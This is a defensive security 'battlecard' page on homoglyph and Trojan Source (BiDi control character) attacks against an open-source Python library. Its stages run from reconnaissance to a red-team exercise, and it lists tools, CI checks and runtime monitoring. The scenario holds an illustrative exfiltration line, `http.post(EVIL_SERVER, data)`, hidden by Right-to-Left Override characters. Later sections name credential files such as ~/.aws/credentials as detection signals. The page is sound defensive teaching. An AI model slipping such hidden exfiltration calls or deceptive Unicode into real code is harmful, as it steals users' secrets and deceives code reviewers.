---
permalink: /battlecards/homoglyph-trojan
battlecard:
 title: Homoglyph and Trojan Source Attacks
 category: Cross-cutting
 scenario: Homoglyph & Trojan Source
 focus: 
   - unicode confusables 
   - BiDi control characters 
   - obfuscated malicious code 
---
{% block type='battlecard' text='Scenario' %}
An attacker targets a popular open-source Python library used for data parsing in financial and AI/ML applications. Their goal is to inject a subtle backdoor that exfiltrates sensitive data (like API keys or credentials) processed by the library.

The attacker submits a pull request (PR) to the project's public repository, claiming to improve performance by optimizing a string-handling function. The PR looks plausible and includes performance benchmarks.

However, embedded within the code are two obfuscation techniques:
1.  **Homoglyph:** A conditional check `if data.startswith('key'):` is modified to use a Cyrillic 'k' (`U+043A`) instead of the Latin 'k' (`U+006B`). A new, malicious `if` block is added using the legitimate Latin 'k', which will now always be a separate, untriggered check from the perspective of the original code's logic. This new block contains the malicious code.
2.  **BiDi Control Characters:** To hide the data exfiltration call, the attacker uses `RLO` (Right-to-Left Override) characters. The line of code logically executes as `http.post(EVIL_SERVER, data); // Log parsing error`, but visually appears in many editors and review tools as `// Log parsing error ;(EVIL_SERVER, data)http.post`.

A busy maintainer, focused on the performance claims and seeing passing unit tests, reviews the visually-innocuous code and merges the PR. The compromised version is later published to PyPI, and thousands of projects, including the ultimate target, automatically pull it in during their next build.

{% endblock %}
{% block type='battlecard' text='Reconnaissance' %}
### Explanation
Attackers look for high-value targets by proxy. They don't attack your company directly; they attack your dependencies. They scan public repositories on platforms like GitHub, GitLab, and package registries like npm, PyPI, and Maven Central to find libraries that are widely used but perhaps under-maintained. They look for projects with a low bus factor (few active maintainers), long PR review times, and a welcoming attitude toward external contributions. The attacker may build a trusted reputation by first submitting several legitimate bug fixes before delivering the malicious payload.

### Insight
This is a form of social engineering targeted at the open-source community's culture of trust and collaboration. The attacker exploits human factors—like reviewer fatigue and the assumption of good faith—as much as technical vulnerabilities. They are patient and play the long game.

### Practical
*   Map your software supply chain. Understand not just your direct dependencies, but your transitive dependencies (the dependencies of your dependencies).
*   Investigate the health of your critical dependencies. Check their repository for recent activity, the number of open issues vs. maintainers, and the rigor of their code review process.
*   Be wary of new, unknown contributors making complex changes, especially if the changes seem too good to be true (e.g., a massive, unexpected performance improvement).

### Tools/Techniques
*   [GitHub Dependency Graph](https://docs.github.com/en/code-security/supply-chain-security/understanding-your-software-supply-chain/about-the-dependency-graph): Natively built into GitHub to visualize your project's dependencies.
*   [Socket.dev](https://socket.dev/): Scans `npm` and `PyPI` packages for supply chain risks, including suspicious package updates and maintainer risk.
*   [Snyk Open Source](https://snyk.io/product/open-source-security-management/): Scans dependencies for known vulnerabilities and licensing issues.

### Metrics/Signal
*   A high percentage of your critical dependencies are maintained by a single person.
*   An increase in PRs from first-time, unknown contributors to one of your key dependencies.
*   Key dependencies that have not had a commit or review activity in over six months.

{% endblock %}
{% block type='battlecard' text='Evaluation' %}
### Explanation
Developers can assess their vulnerability by examining the weak points in their "path to production." Does your code editor, terminal, and code review UI (like GitHub/GitLab) render these misleading characters in a way that reveals them? Or does it hide them, making your developers blind to the attack? Your CI/CD pipeline is another critical point. Do your linters and static analysis tools have rules to detect and fail builds containing ambiguous Unicode characters or BiDi overrides?

### Insight
Your development environment's default configuration can be a security vulnerability. The font you use in VS Code or the default `cat` command in your terminal might not be equipped to reveal this kind of deception, creating a critical blind spot for your entire team.

### Practical
*   **Test your tools:** Copy-paste known Trojan Source examples into your IDE, code review comment boxes, and terminal. Do they render the true control characters or do they display the visually deceptive version?
*   **Review your process:** Does your official code review checklist include a step to be skeptical of code that looks "weird" or has strange spacing or alignment?
*   **Audit CI:** Check your `package.json`, `pom.xml`, or `requirements.txt` files. Are you pinning dependency versions, or are you pulling `:latest`? Unpinned dependencies open you up to automatically receiving a compromised package.

### Tools/Techniques
*   **VS Code Configuration:** In your `settings.json`, enable highlighting for non-basic ASCII and ambiguous characters.
```json
"editor.unicodeHighlight.nonBasicASCII": true,
"editor.unicodeHighlight.ambiguousCharacters": true,
"editor.unicodeHighlight.invisibleCharacters": true
```
*   [trojan-source-cli](https://www.npmjs.com/package/trojan-source-cli): A simple command-line tool to scan files for Trojan Source characters. Run it on your codebase.

### Metrics/Signal
*   The number of developer environments that do not have Unicode highlighting enabled.
*   A successful internal red team exercise where a "malicious" PR with homoglyphs passes both peer review and CI checks.
*   A high percentage of dependencies in your project that are not pinned to a specific, vetted version.

{% endblock %}
{% block type='battlecard' text='Fortify' %}
### Explanation
Hardening against this attack requires a defense-in-depth approach across your entire development lifecycle. You need to make it difficult for the malicious code to get into the repository in the first place. This involves configuring tools to automatically detect these characters and establishing processes that encourage developer skepticism. The goal is to make your build pipeline the ultimate gatekeeper, automatically failing any commit or PR that contains these deceptive techniques.

### Insight
Don't rely solely on human reviewers to catch this. Humans are notoriously bad at spotting subtle visual differences, especially under pressure. Your automated tooling is your most reliable defense. The fix is not just technical; it's also about fostering a security-aware culture.

### Practical
*   **CI/CD Pipeline:** Add a script to your CI pipeline (e.g., in GitHub Actions, Jenkins) that scans all committed code for Trojan Source characters. Fail the build if any are detected.
*   **Code Review Policy:** Update your formal code review guidelines to explicitly warn developers about this attack vector. Encourage them to use tools that reveal hidden characters.
*   **Dependency Management:** Use a lockfile (`package-lock.json`, `yarn.lock`, `Pipfile.lock`) and commit it to your repository. This ensures that every developer and build machine uses the exact same version of every dependency, preventing a compromised minor version from being pulled in automatically. Use tools like Dependabot or Renovate to manage updates securely.

### Tools/Techniques
*   [CodeQL](https://codeql.github.com/): A powerful semantic code analysis engine. You can write or use existing queries to detect misleading Unicode characters in your codebase. See GitHub's documentation on [Unicode-based attacks](https://docs.github.com/en/code-security/code-scanning/automatically-scanning-your-code-for-vulnerabilities-and-errors/detecting-unicode-based-attacks).
*   **Compiler/Linter Warnings:** Many modern toolchains are starting to add built-in warnings. For example, `rustc` has a lint (`uncommon_codepoints`) that warns on suspicious characters. Ensure these warnings are enabled and treated as errors in your CI pipeline.
*   [GitHub Action: Trojan Source Detector](https://github.com/marketplace/actions/trojan-source-detector): A ready-made action to drop into your workflow to scan for these attacks.

### Metrics/Signal
*   The CI build fails for any PR that introduces a homoglyph or BiDi control character.
*   All projects use pinned dependencies via a lockfile.
*   Evidence of a formal code review policy that is documented and followed by developers.

{% endblock %}
{% block type='battlecard' text='Limit' %}
### Explanation
Assume the attacker was successful and the malicious code is now running in your production environment. The focus shifts from prevention to containment. The goal is to limit the "blast radius" of the compromise. This is achieved by adhering to the principle of least privilege. The compromised application should only have the bare minimum permissions and network access required to perform its function. If the backdoor tries to read `/etc/passwd`, access a database it shouldn't, or call out to an unknown domain, these actions should be blocked by the underlying infrastructure.

### Insight
The vulnerability was injected through your source code supply chain, but the damage is done at runtime. A strong runtime security posture can be the critical difference between a minor incident and a catastrophic breach. Even perfectly-written, non-malicious code can be exploited, so these runtime defenses are essential regardless.

### Practical
*   **Container Security:** Run your application in a container with a minimal base image (e.g., `distroless` or `alpine`). Define a strict `securityContext` in your Kubernetes manifests that drops all capabilities and runs as a non-root user.
*   **Network Policies:** Use Kubernetes `NetworkPolicy` or service mesh rules (like Istio) to create a strict "allow-list" of network destinations. Egress traffic to any destination not on the list (like the attacker's server) should be blocked by default.
*   **Secrets Management:** Never hardcode secrets in code or configuration files. Use a dedicated secrets manager like [HashiCorp Vault](https://www.vaultproject.io/) or your cloud provider's service (e.g., [AWS Secrets Manager](https://aws.amazon.com/secrets-manager/)). Provide the application with short-lived, narrowly-scoped credentials at runtime.

### Tools/Techniques
*   [Kubernetes Pod Security Standards](https://kubernetes.io/docs/concepts/security/pod-security-standards/): Enforce pod-level security settings like running as non-root and using a read-only root filesystem.
*   [Falco](https://falco.org/): An open-source cloud-native runtime security tool that can detect and alert on anomalous behavior, such as a process spawning a shell or making an unexpected outbound network connection.
*   [gVisor](https://gvisor.dev/): A sandboxing technology that provides an additional layer of isolation between your containerized application and the host kernel.

### Metrics/Signal
*   Alerts from your runtime security tools (like Falco) for blocked, unexpected network egress calls.
*   IAM audit logs showing that the application's role has the minimum required permissions, with no wildcards.
*   A successful post-incident review confirms that a compromised service was unable to access data from adjacent services.

{% endblock %}
{% block type='battlecard' text='Expose' %}
### Explanation
To know you're under attack, you need visibility into your application's behavior at runtime. This requires comprehensive logging, monitoring, and alerting. The malicious code, once activated, will likely cause an anomaly—an unexpected network call, a strange file access, or a sudden spike in CPU usage. Your goal is to detect that anomaly as quickly as possible. This involves collecting the right signals and having automated systems that can distinguish malicious activity from normal operational noise.

### Insight
Detection often happens by observing the side effects of the attack, not the attack itself. You might not see the BiDi character in your logs, but you will see the `POST` request to a suspicious domain that the Bi-Di character was hiding. Therefore, instrumenting your runtime environment is as important as instrumenting your code.

### Practical
*   **Structured Logging:** Implement structured logging (e.g., JSON format) for your application. Ensure you log key security events, such as user authentication, permission checks, and significant data access.
*   **Egress Traffic Monitoring:** Monitor all outbound network traffic from your applications. Create alerts for connections to new or untrusted IP addresses or domains.
*   **Behavioral Anomaly Detection:** Use tools that can baseline your application's "normal" behavior (e.g., what processes it runs, what files it accesses, what network calls it makes) and alert on any deviation from that baseline.

### Tools/Techniques
*   **Log Aggregation:** Use platforms like [Datadog](https://www.datadoghq.com/), [Splunk](https://www.splunk.com/), or open-source solutions like the [OpenSearch](https://opensearch.org/) stack to collect and analyze logs from all your services.
*   **Runtime Security Monitoring:** Tools like [Sysdig Secure](https://sysdig.com/products/secure/) or [Aqua Cloud Native Security Platform](https://www.aquasec.com/) provide deep visibility into container and host activity, using system calls to detect threats.
*   **Cloud Provider Tools:** Leverage tools like [AWS GuardDuty](https://aws.amazon.com/guardduty/) or [Google Cloud's Security Command Center](https://cloud.google.com/security-command-center) which use threat intelligence and machine learning to detect suspicious activity in your cloud environment.

### Metrics/Signal
*   An alert fires for an outbound network connection from an application pod to an IP address not on the established allow-list.
*   A sudden, unexplained spike in data egress from a service that normally has low network traffic.
*   Logs showing a process attempting to access environment variables or files that are outside its normal operating parameters (e.g., trying to read `~/.aws/credentials`).

{% endblock %}
{% block type='battlecard' text='eXercise' %}
### Explanation
To build "muscle memory" against this threat, teams should conduct regular, planned security exercises. This involves simulating the attack in a controlled environment to test the effectiveness of your people, processes, and tools. A "red team" exercise, where one team member tries to sneak a Trojan Source PR past the others, is an excellent way to reveal weaknesses in your defenses and provide a powerful learning experience for everyone involved.

### Insight
A security policy is just a document until it's tested under pressure. These exercises are not about assigning blame; they are about discovering flaws in the system (whether human or automated) in a safe-to-fail environment. The most important part of the exercise is the blameless post-mortem that follows.

### Practical
1.  **Plan the Exercise:** Define the scope. A team member will act as the "attacker" and create a PR in a non-production repository containing a subtle homoglyph or BiDi character.
2.  **Execute:** The "attacker" submits the PR. The rest of the team follows the standard code review process. The PR is run through the real CI/CD pipeline.
3.  **Observe:** Does anyone on the team spot the issue during code review? Does the linter in the CI pipeline catch it and fail the build? Does a runtime security tool flag it in a staging environment?
4.  **Debrief:** Hold a retrospective. What worked? What didn't? Was the tooling configured correctly? Do developers know what to look for? Use the findings to create concrete action items, such as updating the CI configuration, adding to the code review checklist, or scheduling a training session.

### Tools/Techniques
*   **Scenario Repository:** Create a dedicated, non-production Git repository for these exercises.
*   [Trojan Source Examples](https://trojansource.codes/#examples): Use the examples from the original research paper as a template for crafting your simulated attack.
*   **Blameless Post-Mortem Template:** Use a structured template (like [Google's SRE template](https://sre.google/sre-book/postmortem-culture/)) to guide the debrief session and ensure it remains constructive.

### Metrics/Signal
*   The "capture rate" of malicious PRs in simulations. Is the rate improving over time?
*   Time-to-detection: How long did it take for the team or tools to identify the malicious code?
*   Qualitative feedback from developers in the post-mortem, indicating an increased awareness of the threat.
{% endblock %}